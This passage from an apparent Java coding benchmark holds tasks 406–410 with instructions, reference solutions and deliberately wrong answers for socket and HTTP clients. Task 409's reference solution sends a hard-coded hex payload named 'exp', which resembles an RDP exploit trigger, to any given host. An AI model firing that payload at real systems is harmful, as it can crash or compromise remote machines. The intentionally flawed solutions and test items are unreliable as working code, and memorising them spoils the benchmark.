IOException e) { logger.severe(\"Push thread interrupted: \" + e.getMessage()); } } } } }"
  },
  {
    "Task_id": 406,
    "Instruction": "Task Description: Write a Java function that tests a server's handling of a malformed HTTP request by sending a bad request and verifying the server's response.\n\nFunction Description: The function `testBadRequest` attempts to send a deliberately malformed HTTP POST request to a server and verifies that the server responds with a \"400 Bad Request\" error. The function creates a TCP socket connection to the server, sends the malformed request, reads the server's response, and compares it to the expected response. If the response matches, the test passes; otherwise, it may throw an IOException if the connection is closed prematurely.\n\nInput: None (The server address and port are obtained from `DefaultServer.getDefaultServerAddress()` internally)\n\nOutput: None (The function asserts the server's response matches the expected \"400 Bad Request\" response. Any mismatch or IOException will result in a test failure or exception.)",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.Socket;\n\npublic void testBadRequest() throws IOException {\n    String request = \"POST /\\r HTTP/1.1\\r\\nTrailer:foo, bar\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n9\\r\\nabcdefghi\\r\\n0\\r\\nfoo: fooVal\\r\\n bar: barVal\\r\\n\\r\\n\";\n    String response1 = \"HTTP/1.1 400 Bad Request\\r\\nContent-Length: 0\\r\\nConnection: close\\r\\n\\r\\n\";\n    Socket s = new Socket(DefaultServer.getDefaultServerAddress().getAddress(), DefaultServer.getDefaultServerAddress().getPort());\n    try {\n        s.getOutputStream().write(request.getBytes());\n\n        StringBuilder sb = new StringBuilder();\n        int read = 0;\n        byte[] buf = new byte[100];\n        while (read < response1.length()) {\n            int r = s.getInputStream().read(buf);\n            if (r <= 0) break;\n            if (r > 0) {\n                read += r;\n                sb.append(new String(buf, 0, r));\n            }\n        }\n        Assert.assertEquals(response1, sb.toString());\n\n    } catch (IOException expected) {\n        //this can happen as well, as in some cases we may not have fully consumed the read side\n        //before the connection is shutdown, namely when we are running in test.single\n    } finally {\n        s.close();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 15,
    "wrong_result": "public void testBadRequest() throws IOException {\n    InetAddress serverAddress = DefaultServer.getDefaultServerAddress().getAddress();\n    int serverPort = DefaultServer.getDefaultServerAddress().getPort();\n    try (Socket socket = new Socket(serverAddress, serverPort)) {\n        OutputStream out = socket.getOutputStream();\n        String request = \"POST /test HTTP/1.1\\r\\n\\r\\n\";\n        out.write(request.getBytes());\n        out.flush();\n        InputStream in = socket.getInputStream();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(in));\n        StringBuilder response = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            response.append(line).append(\"\\n\");\n        }\n        String firstLine = response.toString().split(\"\\n\")[0];\n        if (!firstLine.equals(\"HTTP/1.1 400 Bad Request\")) {\n            throw new IOException(\"Expected 400 Bad Request, got: \" + firstLine);\n        }\n    } catch (IOException e) {\n        throw new IOException(\"Server connection failed: \" + e.getMessage());\n    }\n}"
  },
  {
    "Task_id": 407,
    "Instruction": "Task Description: Create a Java class that acts as a TCP client within a servlet context, handling HTTP requests by forwarding them to a specified server via TCP and returning the server's response.\n\nClass Description: The Lisplet class extends HttpServlet to handle HTTP POST requests. It establishes a TCP connection to a specified host and port, sends the HTTP request data in a custom format, processes the server's response, and returns it to the client.\n\nAttributes:\n- host: String - The hostname or IP address of the TCP server to connect to\n- port: int - The port number of the TCP server to connect to\n\nMethods:\n- doPost(HttpServletRequest req, HttpServletResponse resp) -> void - Handles HTTP POST requests by establishing a TCP connection, sending the request, processing the response, and closing the connection\n- transferResponseBody(HttpServletResponse resp, PushbackInputStream strm) -> void - Transfers the response body from the server to the HTTP response output stream\n- getResponseHeader(HttpServletRequest req, HttpServletResponse resp, PushbackInputStream strm) -> boolean - Reads and processes the response header from the server\n- sendRequest(HttpServletRequest req, Writer writer) -> void - Formats and sends the HTTP request data to the server\n- writeTagValuePair(Writer writer, String tag, String value) -> void - Helper method to write tag-value pairs in the custom request format",
    "Canonical_solution": "import java.io.*;\nimport java.net.*;\nimport javax.servlet.http.*;\n\npublic class Lisplet extends HttpServlet {\n    private String host;\n    private int port;\n\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp)\n            throws ServletException, IOException {\n        Socket socket = new Socket(host, port);\n        try {\n            Writer writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n            sendRequest(req, writer);\n            PushbackInputStream strm = new PushbackInputStream(\n                    new BufferedInputStream(socket.getInputStream()));\n            if(getResponseHeader(req, resp, strm))\n                transferResponseBody(resp, strm);\n        } finally {\n            socket.close();\n        }\n    }\n\n    protected void transferResponseBody(HttpServletResponse resp, PushbackInputStream strm)\n            throws ServletException, IOException {\n        OutputStream outs = resp.getOutputStream();\n        int b;\n        while((b = strm.read()) != -1)\n            outs.write(b);\n        outs.flush();\n    }\n\n    protected boolean getResponseHeader(HttpServletRequest req, HttpServletResponse resp, PushbackInputStream strm)\n        throws ServletException, IOException {\n        ArrayList list = readSexpr(strm);\n        return processResponse(req, resp, list);\n    }\n\n    protected void sendRequest(HttpServletRequest req, Writer writer)\n            throws IOException {\n        writer.write(\"(\");\n        writeTagValuePair(writer, \"method\", req.getMethod());\n        writeTagValuePair(writer, \"uri\", req.getRequestURI());\n        writeTagValuePair(writer, \"protocol\", req.getProtocol());\n        writer.write(\")\");\n        writer.flush();\n    }\n\n    protected void writeTagValuePair(Writer writer, String tag, String value)\n            throws IOException {\n        writer.write(\"(\");\n        writer.write(tag);\n        writer.write(\" \");\n        writer.write(\"\\\"\");\n        writer.write(value.replaceAll(\"\\\\\\\\\",\"\\\\\\\\\\\\\\\\\").replaceAll(\"\\\"\",\"\\\\\\\\\\\"\"));\n        writer.write(\"\\\"\");\n        writer.write(\")\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "import java.io.*;\nimport java.net.*;\nimport javax.servlet.http.*;\n\npublic class Lisplet extends HttpServlet {\n    private String host;\n    private int port;\n\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        try (Socket socket = new Socket(host, port);\n             OutputStream out = socket.getOutputStream();\n             InputStream in = socket.getInputStream()) {\n            PrintWriter writer = new PrintWriter(out, true);\n            sendRequest(req, writer);\n            PushbackInputStream strm = new PushbackInputStream(in, 1024);\n            if (getResponseHeader(req, resp, strm)) {\n                transferResponseBody(resp, strm);\n            }\n        } catch (IOException e) {\n            resp.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, \"TCP connection failed\");\n        }\n    }\n\n    private void sendRequest(HttpServletRequest req, Writer writer) throws IOException {\n        for (String paramName : req.getParameterNames()) {\n            String paramValue = req.getParameter(paramName);\n            writeTagValuePair(writer, paramName, paramValue);\n        }\n    }\n\n    private void writeTagValuePair(Writer writer, String tag, String value) throws IOException {\n        writer.write(tag + \"=\" + value);\n        writer.write(\"\\r\\n\");\n    }\n\n    private boolean getResponseHeader(HttpServletRequest req, HttpServletResponse resp, PushbackInputStream strm) throws IOException {\n        StringBuilder headerBuilder = new StringBuilder();\n        String line;\n        while ((line = readLine(strm)) != null) {\n            line = line.trim();\n            if (line.isEmpty()) {\n                return true;\n            }\n            headerBuilder.append(line).append(\"\\r\\n\");\n        }\n        return false;\n    }\n\n    private String readLine(PushbackInputStream strm) throws IOException {\n        StringBuilder line = new StringBuilder();\n        int c;\n        while ((c = strm.read()) != -1) {\n            char ch = (char) c;\n            if (ch == '\\r') {\n                int next = strm.read();\n                if (next == '\\n') {\n                    strm.unread(next);\n                    break;\n                } else {\n                    strm.unread(c);\n                    break;\n                }\n            } else if (ch == '\\n') {\n                break;\n            } else {\n                line.append(ch);\n            }\n        }\n        return line.toString();\n    }\n\n    private void transferResponseBody(HttpServletResponse resp, PushbackInputStream strm) throws IOException {\n        byte[] buffer = new byte[1024];\n        int len;\n        while ((len = strm.read(buffer)) > 0) {\n            resp.getOutputStream().write(buffer, 0, len);\n        }\n    }\n\n    public Lisplet() {\n        host = \"example.com\";\n        port = 8080;\n    }\n}"
  },
  {
    "Task_id": 408,
    "Instruction": "Task Description: Create a Java class that implements a TCP client for basic communication with a server using Java's IO and networking capabilities.\n\nClass Description: The HelloClient class establishes a TCP connection to a specified server, receives messages from the server, and properly closes the connection when done. It uses Java's Socket and BufferedReader for network communication.\n\nAttributes:\n- client: Socket - The socket object representing the connection to the server\n- buf: BufferedReader - The buffered reader for receiving data from the server\n\nMethods:\n- connect(String host, int port) -> void - Establishes a connection to the specified server host and port\n  - Input: \n    - host: String - The server hostname or IP address\n    - port: int - The server port number\n  - Throws: Exception - If connection fails\n- receive() -> String - Reads a line of text from the server\n  - Returns: String - The received message from the server\n  - Throws: Exception - If reading fails\n- close() -> void - Closes the connection and cleans up resources\n  - Throws: Exception - If closing fails",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.Socket;\n\npublic class HelloClient {\n\n    private Socket client;\n    private BufferedReader buf;\n\n    public void connect(String host, int port) throws Exception {\n        client = new Socket(host, port);\n        InputStreamReader inputStreamReader = new InputStreamReader(client.getInputStream());\n        buf = new BufferedReader(inputStreamReader);\n    }\n\n    public String receive() throws Exception {\n        String str = buf.readLine();\n        return str;\n    }\n\n    public void close() throws Exception {\n        buf.close();\n        client.close();\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class HelloClient {\n    private Socket client;\n    private BufferedReader buf;\n\n    public void connect(String host, int port) throws Exception {\n        client = new Socket(host, port);\n        buf = new BufferedReader(new InputStreamReader(client.getInputStream()));\n    }\n\n    public String receive() throws Exception {\n        String line = buf.readLine();\n        if (line == null) {\n            throw new Exception(\"No message received\");\n        }\n        return line;\n    }\n\n    public void close() throws Exception {\n        if (buf != null) {\n            buf.close();\n        }\n        if (client != null) {\n            client.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 409,
    "Instruction": "Task Description: Create a Java function that sends a raw RDP (Remote Desktop Protocol) connection request to a specified host and port using TCP socket communication. The function should handle the socket connection, data transmission, and proper resource cleanup.\n\nFunction Description: The function establishes a TCP connection to a specified remote host and port, sends a pre-defined hexadecimal RDP protocol payload, and then closes the connection. The function includes error handling for connection issues and implements a socket timeout to prevent hanging.\n\nInput:\n- rhost: String - The remote host IP address or hostname to connect to\n- rport: int - The remote port number for the RDP service\n\nOutput: None (void function), though errors will be printed to standard error if they occur\n\nNote: The function uses a static hexadecimal string (exp) containing the RDP protocol payload, which is converted to bytes before transmission. The socket timeout is set to 3 milliseconds to prevent prolonged connection attempts.",
    "Canonical_solution": "import java.net.Socket;\nimport java.io.OutputStream;\n\npublic static String exp = \"030000130ee000000000000100080000000000030001d602f0807f658201940401010401010101ff30190204000000000204000000020204000000000204000000010204000000000204000000010202ffff020400000002301902040000000102040000000102040000000102040000000102040000000002040000000102020420020400000002301c0202ffff0202fc170202ffff0204000000010204000000000204000000010202ffff02040000000204820133000500147c0001812a000800100001c00044756361811c01c0d800040008008002e00101ca03aa09040000ce0e000048004f005300540000000000000000000000000000000000000000000000000004000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca010000000000100007000100300030003000300030002d003000300030002d0030003000300030003000300030002d003000300030003000300000000000000000000000000000000000000000000000000004c00c000d0000000000000002c00c001b0000000000000003c02c0003000000726470647200000000008080636c6970726472000000a0c0726470736e640000000000c00300000c02f08004010001000300000802f080280300000c02f08038000603ef0300000c02f08038000603eb0300000c02f08038000603ec0300000c02f08038000603ed0300000c02f08038000603ee0300000b06d00000123400\";\n\npublic void sendRDPRequest(String rhost, int rport) {\n    try {\n        byte[] bytes = HexUtils.hex2Bytes(exp);\n        Socket socket = new Socket(rhost, rport);\n        socket.setSoTimeout(3);\n        OutputStream out = socket.getOutputStream();\n        out.write(bytes);\n        out.flush();\n        out.close();\n        socket.close();\n    } catch (Exception e) {\n        e.printStackTrace();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class RdpClient {\n    private static final String EXP = \"0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f\"; // Example RDP payload\n\n    public static void connectToRdp(String rhost, int rport) {\n        try (Socket socket = new Socket()) {\n            socket.setSoTimeout(3);\n            socket.connect(new InetSocketAddress(rhost, rport));\n            byte[] data = hexToBytes(EXP);\n            try (OutputStream out = socket.getOutputStream()) {\n                out.write(data);\n            }\n        } catch (IOException e) {\n            System.err.println(\"Connection failed: \" + e.getMessage());\n        }\n    }\n\n    private static byte[] hexToBytes(String hex) {\n        int len = hex.length();\n        byte[] data = new byte[len / 2];\n        for (int i = 0; i < len; i += 2) {\n            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4) & 0xFF |\n                                 (Character.digit(hex.charAt(i + 1), 16) & 0xFF));\n        }\n        return data;\n    }\n}"
  },
  {
    "Task_id": 41,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality for interacting with the OpenMHz API, including methods for testing connection authorization and uploading audio recordings with metadata.\n\nClass Description: OpenMHzHttpClient is a utility class that provides HTTP client operations for the OpenMHz API. It handles both synchronous and asynchronous requests, manages connection settings, and processes API responses. The class includes error handling and logging capabilities.\n\nAttributes:\n- mLog: Logger - SLF4J logger instance for error and debug logging\n- mHttpClient: HttpClient - Configured HTTP client instance with HTTP/2 support, redirect policy, and timeout settings\n\nMethods:\n- testConnection(String host, String systemName, String apiKey) -> String - Tests API connection and authorization by sending a POST request to the authorize endpoint. Returns status messages based on response code.\n  Input:\n    - host: String - Base URL of the OpenMHz server\n    - systemName: String - Name of the target system\n    - apiKey: String - API key for authentication\n  Output:\n    - String - Status message (\"OK\", \"Invalid API Key\", \"Invalid System Name\", \"No Response\", or \"Unknown Exception\")\n\n- sendAudioRecording(String uri, byte[] audioBytes, String boundary, String apiKey, long frequency, long timestampSeconds, int durationSeconds, String talkgroup, String radioId) -> void - Asynchronously uploads an audio recording with metadata to the OpenMHz API using multipart/form-data format.\n  Input:\n    - uri: String - Target endpoint URL\n    - audioBytes: byte[] - Audio file data to upload\n    - boundary: String - Multipart boundary string\n    - apiKey: String - API key for authentication\n    - frequency: long - Frequency value in Hz\n    - timestampSeconds: long - Recording start time in seconds\n    - durationSeconds: int - Recording duration in seconds\n    - talkgroup: String - Talkgroup identifier\n    - radioId: String - Radio source identifier\n  Output: None (asynchronous operation with error logging)",
    "Canonical_solution": "import com.google.common.net.HttpHeaders;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.time.Duration;\nimport java.util.concurrent.CompletionException;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class OpenMHzHttpClient {\n\n    private final static Logger mLog = LoggerFactory.getLogger(OpenMHzHttpClient.class);\n    private HttpClient mHttpClient = HttpClient.newBuilder()\n        .version(HttpClient.Version.HTTP_2)\n        .followRedirects(HttpClient.Redirect.NORMAL)\n        .connectTimeout(Duration.ofSeconds(20))\n        .build();\n\n    public String testConnection(String host, String systemName, String apiKey) {\n        String uri = host + \"/\" + systemName + \"/authorize\";\n\n        HttpRequest request = HttpRequest.newBuilder()\n            .uri(URI.create(uri))\n            .header(HttpHeaders.CONTENT_TYPE, \"application/x-www-form-urlencoded\")\n            .header(HttpHeaders.USER_AGENT, \"sdrtrunk\")\n            .POST(HttpRequest.BodyPublishers.ofString(\"api_key=\" + apiKey))\n            .build();\n\n        try {\n            HttpResponse<String> response = mHttpClient.send(request, HttpResponse.BodyHandlers.ofString());\n\n            if (response.statusCode() == 200) {\n                return \"OK\";\n            } else if(response.statusCode() == 403) {\n                return \"Invalid API Key\";\n            } else if(response.statusCode() == 500) {\n                return \"Invalid System Name\";\n            }\n\n            return \"No Response\";\n        }\n        catch(Exception e) {  \n            Throwable throwableCause = e.getCause();\n\n            if(throwableCause instanceof ConnectException) {\n                return \"No Response\";\n            }\n\n            mLog.error(\"Exception connecting to OpenMHz server [\" + e.toString() + \"]\");\n            return \"Unknown Exception\";\n        }\n    }\n\n    public void sendAudioRecording(String uri, byte[] audioBytes, String boundary, String apiKey, long frequency, \n                                  long timestampSeconds, int durationSeconds, String talkgroup, String radioId) {\n        OpenMHzBuilder bodyBuilder = new OpenMHzBuilder();\n        bodyBuilder\n            .addFile(audioBytes)\n            .addPart(FormField.FREQ, frequency)\n            .addPart(FormField.START_TIME, timestampSeconds)\n            .addPart(FormField.STOP_TIME, timestampSeconds)\n            .addPart(FormField.CALL_LENGTH, durationSeconds)\n            .addPart(FormField.TALKGROUP_NUM, talkgroup)\n            .addPart(FormField.EMERGENCY, 0)\n            .addPart(FormField.API_KEY, apiKey)\n            .addPart(FormField.SOURCE_LIST, \"[{ \\\"pos\\\": 0.00, \\\"src\\\": \" + radioId + \"}]\");\n\n        HttpRequest fileRequest = HttpRequest.newBuilder()\n            .uri(URI.create(uri))\n            .header(HttpHeaders.CONTENT_TYPE, \"multipart/form-data; boundary=\" + boundary)\n            .header(HttpHeaders.USER_AGENT, \"sdrtrunk\")\n            .POST(bodyBuilder.build())\n            .build();\n\n        mHttpClient.sendAsync(fileRequest, HttpResponse.BodyHandlers.ofString())\n            .whenComplete((fileResponse, throwable1) -> {\n                if(throwable1 != null || fileResponse.statusCode() != 200) {\n                    if(throwable1 instanceof IOException || throwable1 instanceof CompletionException) {\n                        mLog.error(\"OpenMHz API file upload fail [\" +\n                            fileResponse.statusCode() + \"] response [\" +\n                            fileResponse.body() + \"]\");\n                    }\n                    else {\n                        mLog.error(\"OpenMHz API file upload fail [\" +\n                            fileResponse.statusCode() + \"] response [\" +\n                            fileResponse.body() + \"]\");\n                    }\n                }\n            });\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "public class OpenMHzHttpClient {\n    private final Logger mLog = LoggerFactory.getLogger(OpenMHzHttpClient.class);\n    private final HttpClient mHttpClient;\n\n    public OpenMHzHttpClient() {\n        mHttpClient = HttpClient.newBuilder()\n                .followRedirects(Redirect.NEVER)\n                .connectTimeout(30, TimeUnit.SECONDS)\n                .socketTimeout(30, TimeUnit.SECONDS)\n                .build();\n    }\n\n    public String testConnection(String host, String systemName, String apiKey) {\n        try {\n            URI uri = URI.create(host + \"/authorize\");\n            String formData = \"systemName=\" + URLEncoder.encode(systemName, StandardCharsets.UTF_8) + \"&apiKey=\" + URLEncoder.encode(apiKey, StandardCharsets.UTF_8);\n            HttpRequest request = HttpRequest.newBuilder()\n                    .uri(uri)\n                    .header(\"Content-Type\", \"application/x-www-form-urlencoded\")\n                    .POST(HttpRequest.BodyPublishers.ofString(formData))\n                    .build();\n\n            HttpResponse<String> response = mHttpClient.send(request, HttpResponse.BodyHandlers.ofString());\n            int statusCode = response.statusCode();\n\n            if (statusCode == 200) {\n                mLog.debug(\"Connection authorized successfully.\");\n                return \"OK\";\n            } else if (statusCode == 401) {\n                mLog.warn(\"Unauthorized access. Invalid API key.\");\n                return \"Invalid API Key\";\n            } else if (statusCode == 404) {\n                mLog.warn(\"System not found. Invalid system name.\");\n                return \"Invalid System Name\";\n            } else {\n                mLog.error(\"Unexpected response code: {}\", statusCode);\n                return \"Unknown Exception\";\n            }\n        } catch (Exception e) {\n            mLog.error(\"Error testing connection: {}\", e.getMessage(), e);\n            return \"Unknown Exception\";\n        }\n    }\n\n    public void sendAudioRecording(String uri, byte[] audioBytes, String boundary, String apiKey, long frequency, long timestampSeconds, int durationSeconds, String talkgroup, String radioId) {\n        ExecutorService executor = Executors.newSingleThreadExecutor();\n        CompletableFuture.runAsync(() -> {\n            try {\n                StringBuilder sb = new StringBuilder();\n                sb.append(\"--\").append(boundary).append(\"\\r\\n\");\n                sb.append(\"Content-Disposition: form-data; name=\\\"audio\\\"; filename=\\\"recording.wav\\\"\\r\\n\");\n                sb.append(\"Content-Type: audio/wav\\r\\n\\r\\n\");\n                sb.append(new String(audioBytes)).append(\"\\r\\n\");\n                sb.append(\"--\").append(boundary).append(\"\\r\\n\");\n                sb.append(\"Content-Disposition: form-data; name=\\\"metadata\\\"\\r\\n\\r\\n\");\n                sb.append(\"frequency=\").append(frequency).append(\"&timestamp=\").append(timestampSeconds).append(\"&duration=\").append(durationSeconds).append(\"&talkgroup=\").append(talkgroup).append(\"&radioId=\").append(radioId).append(\"\\r\\n\");\n                sb.append(\"--\").append(boundary).append(\"--\\r\\n\");\n\n                String requestBody = sb.toString();\n                HttpRequest request = HttpRequest.newBuilder()\n                        .uri(URI.create(uri))\n                        .header(\"Content-Type\", \"multipart/form-data; boundary=\" + boundary)\n                        .header(\"Authorization\", \"Bearer \" + apiKey)\n                        .POST(HttpRequest.BodyPublishers.ofString(requestBody))\n                        .build();\n\n                HttpResponse<String> response = mHttpClient.send(request, HttpResponse.BodyHandlers.ofString());\n                int statusCode = response.statusCode();\n                if (statusCode == 200) {\n                    mLog.info(\"Audio recording uploaded successfully.\");\n                } else {\n                    mLog.error(\"Failed to upload audio recording. Status code: {}\", statusCode);\n                }\n            } catch (Exception e) {\n                mLog.error(\"Error uploading audio recording: {}\", e.getMessage(), e);\n            } finally {\n                executor.shutdown();\n            }\n        }, executor);\n    }\n}"
  },
  {
    "Task_id": 410,
    "Instruction": "Task Description: Create a Java class that establishes a TCP connection to a server, sends commands, and receives responses, including the ability to list files and receive image data from the server.\n\nClass Description: The DeviceConnection class manages a TCP socket connection to a server, providing methods to interact with the server by sending commands and processing responses. It handles both text-based communication and binary image data transfer, with optional ZIP compression support.\n\nAttributes:\n- socket: Socket - The TCP socket connection to the server\n- reader: Reader - Inner class for reading data from the server\n- writer: Writer - Inner class for writing data to the server\n- USE_ZIP: boolean - Flag indicating whether to use ZIP compression for image data\n\nMethods:\n- DeviceConnection() -> void - Constructor that establishes a connection to the server at localhost:4242\n- close() -> void - Closes the socket connection\n- listLayoutFiles() -> ArrayList<String> - Requests and returns a list of layout files from the server\n- takePicture() -> Image - Requests an image from the server and returns it as a BufferedImage\n- complete() -> void - Verifies the completion of a server operation\n- Reader(InputStream) -> void - Inner class constructor for reading data\n- nextLine() -> String - Reads a line of text from the server (Reader class method)\n- Writer(OutputStream) -> void - Inner class constructor for writing data\n- println(String) -> void - Writes a line of text to the server (Writer class method)",
    "Canonical_solution": "import java.awt.Image;\nimport java.awt.image.BufferedImage;\nimport java.io.*;\nimport java.net.Socket;\nimport java.nio.ByteBuffer;\nimport java.nio.ByteOrder;\nimport java.nio.IntBuffer;\nimport java.util.ArrayList;\nimport java.util.zip.ZipInputStream;\n\npublic class DeviceConnection {\n    private static final boolean USE_ZIP = true;\n    private Socket socket;\n    private Reader reader;\n    private Writer writer;\n\n    public DeviceConnection() {\n        try {\n            socket = new Socket(\"localhost\", 4242);\n            reader = new Reader(socket.getInputStream());\n            writer = new Writer(socket.getOutputStream());\n        } catch (IOException e) {\n            System.err.println(\"Did you \\\"adb forward tcp:4242 tcp:4242\\\"\");\n            e.printStackTrace();\n        }\n    }\n\n    public void close() {\n        try {\n            if (socket != null) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public ArrayList<String> listLayoutFiles() {\n        ArrayList<String> files = new ArrayList<>();\n        if (writer == null) {\n            return files;\n        }\n        writer.println(\"LIST\");\n        boolean done = false;\n        while (!done) {\n            String response = reader.nextLine();\n            if (response.equals(\"DONE\")) {\n                done = true;\n            } else {\n                files.add(response);\n                System.out.println(\"Server response: \" + response);\n            }\n        }\n        return files;\n    }\n\n    public Image takePicture() {\n        writer.println(\"TAKE_PICTURE\");\n        String response = reader.nextLine();\n        int w = Integer.parseInt(response);\n        response = reader.nextLine();\n        int h = Integer.parseInt(response);\n        response = reader.nextLine();\n        int size = Integer.parseInt(response);\n        if (size == 0) {\n            complete();\n            return null;\n        }\n        byte[] bytes = new byte[size];\n        BufferedImage image = null;\n        try {\n            InputStream inputStream = reader.stream;\n            int offset = 0;\n            while (offset < size) {\n                int toRead = size - offset;\n                int read = inputStream.read(bytes, offset, toRead);\n                if (read > 0) {\n                    offset += read;\n                }\n            }\n            if (USE_ZIP) {\n                try {\n                    ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);\n                    ZipInputStream zipInputStream = new ZipInputStream(byteArrayInputStream);\n                    zipInputStream.getNextEntry();\n                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n                    byte[] buff = new byte[32768];\n                    int len = 0;\n                    while ((len = zipInputStream.read(buff)) > 0) {\n                        byteArrayOutputStream.write(buff, 0, len);\n                    }\n                    zipInputStream.closeEntry();\n                    zipInputStream.close();\n                    bytes = byteArrayOutputStream.toByteArray();\n                } catch(IOException e){\n                    e.printStackTrace();\n                }\n            }\n\n            image = new BufferedImage(w, h, BufferedImage.TYPE_INT_ARGB);\n            IntBuffer intBuffer = ByteBuffer.wrap(bytes).order(ByteOrder.LITTLE_ENDIAN).asIntBuffer();\n            int[] array = new int[intBuffer.remaining()];\n            intBuffer.get(array);\n            for (int i = 0; i < array.length; i++) {\n                int pixel = array[i];\n                int alpha = (pixel >> 24) & 0xff;\n                int red = (pixel >> 16) & 0xff;\n                int green = (pixel >> 8) & 0xff;\n                int blue = (pixel) & 0xff;\n                array[i] = (alpha << 24) + (blue << 16) + (green << 8) + red;\n            }\n            image.getRaster().setDataElements(0, 0, w, h, array);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        complete();\n        return image;\n    }\n\n    private class Reader {\n        DataInputStream stream;\n\n        Reader(InputStream stream) {\n            this.stream = new DataInputStream(stream);\n        }\n\n        String nextLine() {\n            try {\n                return stream.readUTF();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            return \"\";\n        }\n    }\n\n    private class Writer {\n        DataOutputStream stream;\n\n        Writer(OutputStream stream) {\n            this.stream = new DataOutputStream(stream);\n        }\n\n        void println(String text) {\n            try {\n                stream.writeUTF(text);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void complete() {\n        String done = reader.nextLine();\n        if (!done.equals(\"DONE\")) {\n            System.out.println(\"WTF!!\");\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class DeviceConnection {\n    private Socket socket;\n    private Reader reader;\n    private Writer writer;\n    private boolean USE_ZIP;\n\n    public DeviceConnection() {\n        try {\n            socket = new Socket(\"localhost\", 4242);\n            reader = new Reader(socket.getInputStream());\n            writer = new Writer(socket.getOutputStream());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void close() {\n        try {\n            if (socket != null) socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public ArrayList<String> listLayoutFiles() {\n        ArrayList<String> files = new ArrayList<>();\n        try {\n            writer.println(\"LIST_LAYOUTS\");\n            String line;\n            while ((line = reader.nextLine()) != null && !line.equals(\"COMPLETED\")) {\n                files.add(line);\n            }\n            complete();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return files;\n    }\n\n    public Image takePicture() {\n        Image image = null;\n        try {\n            writer.println(\"TAKE_PICTURE\");\n            String response = reader.nextLine();\n            if (response.equals(\"COMPLETED\")) {\n                byte[] imageData = new byte[1024];\n                int bytesRead;\n                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n                while ((bytesRead = socket.getInputStream().read(imageData)) != -1) {\n                    byteArrayOutputStream.write(imageData, 0, bytesRead);\n                }\n                byte[] compressedData = byteArrayOutputStream.toByteArray();\n                if (USE_ZIP) {\n                    ByteArrayInputStream bais = new ByteArrayInputStream(compressedData);\n                    ZipInputStream zis = new ZipInputStream(new BufferedInputStream(bais));\n                    ZipEntry entry = zis.getNextEntry();\n                    if (entry != null) {\n                        byte[] buffer = new byte[1024];\n                        int len;\n                        ByteArrayOutputStream bos = new ByteArrayOutputStream();\n                        while ((len = zis.read(buffer)) > 0) {\n                            bos.write(buffer, 0, len);\n                        }\n                        compressedData = bos.toByteArray();\n                        zis.close();\n                    }\n                }\n                ByteArrayInputStream bis = new ByteArrayInputStream(compressedData);\n                image = ImageIO.read(bis);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return image;\n    }\n\n    public void complete() {\n        try {\n            String line = reader.nextLine();\n            if (line != null && line.equals(\"COMPLETED\")) {\n                // Do nothing\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private class Reader {\n        private BufferedReader in;\n\n        public Reader(InputStream inputStream) {\n            in = new BufferedReader(new InputStreamReader(inputStream));\n        }\n\n        public String nextLine() {\n            try {\n                return in.readLine();\n            } catch (IOException e) {\n                e.printStackTrace();\n                return null;\n            }\n        }\n    }\n\n    private class Writer {\n        private BufferedWriter out;\n\n        public Writer(OutputStream outputStream) {\n            out = new BufferedWriter(new OutputStreamWriter(outputStream));\n        }\n\n        public void println(String s) {\n            try {\n                out.println(s);\n                out.flush();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 411,
